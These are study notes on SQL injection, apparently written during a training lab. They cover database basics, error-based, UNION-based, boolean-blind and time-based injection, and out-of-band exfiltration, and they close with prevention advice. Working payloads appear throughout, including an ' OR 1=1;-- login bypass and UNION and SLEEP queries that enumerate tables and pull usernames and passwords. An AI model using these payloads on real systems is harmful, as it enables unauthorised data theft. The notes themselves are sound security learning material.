- SQL => Structured Query Language
- SQLi => Is an attack on a web applicaiotn database causes a malicious queries to be excuted resulting in steeling or damageing or alter the data.

- What Is Database?
	It's a way of storing data in an organised way, Database is controld by DBMS(DataBase Managment System)
- DBMS => Theh software that control the database.

# Examples Of DBs
	- MYSQL
	- Microsoft SQL Server
	- Accsse
	- PostgerSQL
	- SQLite
	
- The DB-server is consistis of databases, each database consists of tables , each table consists of coulmn & Rows
- Coulmn => Field
- Row => Record

- Types of Databases
---------------------
	1. Relational:
		A relational database, stores information in tables and often the tables have shared information between them, they use columns to specify and define the data being stored and rows to actually store the data. The tables will often contain a column that has a unique ID (primary key) which will then be used in other tables to reference it and cause a relationship between the tables, hence the name relational database.
	
	2. Non-Relational
		Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch.

- SELECT * FEOM users LIMIT 1; => selecting one row
- SELECT * FROM users LIMIT 1,1 => skip the first row, and selecting the second row
- SELECT * FROM users LIMIT 2,1 => skips the first two records
`In general the first num tells the db how many nums to skip, the 2nd num tells the  db how many rows to retrive`
- `INSERT INTO users (user, pass) VALUES('admin', 'p@ssw0rd');`


# WHAT IS SQL INJECTION?
	- the SQL can turn into SQLi when the user input gets includeed in a SQL query.
	
# SQLi types:
-------------
	1. In-Band SQLI
	2. Blind SQLi
		- Authentication Bypass
		- Boolean Base
		- Time Base 
	3. Out Of Band SQLi

1. In-Band SQLi
----------------
	- In-Band sqli => In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


	- Error-based SQLi => This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 
	
	- UNION-Based SQLi => This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.
===================================
- The key to discover error-based sqli is to inject ' or " and look for to the error
- information_schema database => contains information about all the databases and tables the user has access to.
# ERROR BASED SQLI
	1. input ' or " seeking  for a database error
	2. `cdc union select null,null,null` => to know the number of coulmns, num of fields of the select in backend must be the same num og fields of the numion statement.
	3. `cdc union select null,null,database()` => to know the database name
	4. `cdc union select null, null, group_concat(table_name) from informtion_schema.tables where table_schema='db_name';`
	5. `cdc union select null, null, group_concat(coulmn_name) from information_shcema.coulmns where tabe_name = 'name table';` => to know the column names in the required table
	6. retrive what you want from the database like this query => `cdc union select null, null, group_concat(username,password)  from staff_users;`
	
	
# Blind SQLi => Authentication bypass
	- `select * from users where username='%username%' and password='%password%' LIMIT 1;` => this is usally the back-end sql query 
	- by put `' OR 1=1;--` in the password field, the query becomes  `select * from users where username='' and password='' OR 1=1;-- LIMIT 1;` => which return True to the web app and you now bypass the login logic.


# Blind SQLi => Boolean Blind SQLi
	- Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not.
	
	1. Checks num of columns
	2. after thatwe we need to establish the db name 
		`cdc' union select null, null,null where  database() like'a%'` => checks if the db_name starts with a or not and cycle all the letters, numbers and characters and so on with the remain letters, you can user the intruder using burpsuite.
	3. after discovering the db_name we need to establish the tabes name using
		`cdc' union select null, null, null from information_schema.tables where table_schema ='sqli_three' and table_name like 'a%'` => like we did with the db_name, we will cycle all the letters, numbers and characters to discover the table name, also you can use the burp intruder.
	4. the same will be done to enumerate the columns number 
		`cdc' union select null, null, null from information_schema.columns where table_schema='sqli_three' and table_name='users' and column_name like 'a%` 
	5. while discovering the column names, each time you discover a field name you must add this to the union query => column_name ! = 'discoverd_name'
	6. you now have  the db_name, table_name and the column names, now we can retrive data using
		`cdc' union select null, null, null from users where username like 'a%';` => cycle all letters, numbers and characters to discover a user name,and each time you discover a new result add this to the union query and username ! = 'discoverd one';
	7. do the same thing with the remain fields , and that's it :)


# Blind SQLi => Time Based
	- A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 
	
	1. selecting the number of columns
		`cdc' union select sleep(5), null;--` => if the request sleep 4 seconds, this means that the 2 columns is correct.
	2. establishing the db_name using
		`cdc' union select sleep(5),null where database() like 'a%';--` => cycle all the letters, numbers and characters, the one will take 5 sec is correct.
	3. discover the table name
		`cdc' union select null, sleep(5) from information_schema.tables where table_schema='sqli_four' and table_name like 'a%';--`
	4. after established the table name, now we need to discover the column names
		`cdc' union select null, sleep(5) from information_schema.columns where table_schema='sqli_four' and table_name='users' and column_name like 'a%';--` => after discovering a columnn name add this at the end of the union query column_name ! = 'discoverd one'
	5. after discovering the column names, now we can retrive data using, lets discover a username
		`cdc union select null, sleep(5) from users where username like 'a%'`;-- => cycle all letters, numbers and characters till you reach a correct username.
	6. assume the you discovered a username = admin, now let's discover its password
		`cdc' union select null, sleep(5) from users where username='admin' and password like 'a%';--`


# Out-of-band SQLi
	- Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.

An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.

1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

2) The Website makes an SQL query to the database which also passes the hacker's payload.

3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database


	- for short, the hacker inject a sql payload in the web app, afterthat the web app send the query with the payload which containing a malicious code forces the db to send the data to the hacker with out retriving it in the response to the web app.  
	
# Remediation => How to prevent SQLi?

	- Prepared Statements:
		In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look a lot cleaner and easier to read.

	- Input Validation:
		Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 
	
	- Escaping User Input:
		Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.
		





==========================
	Alhamdllah
==========================








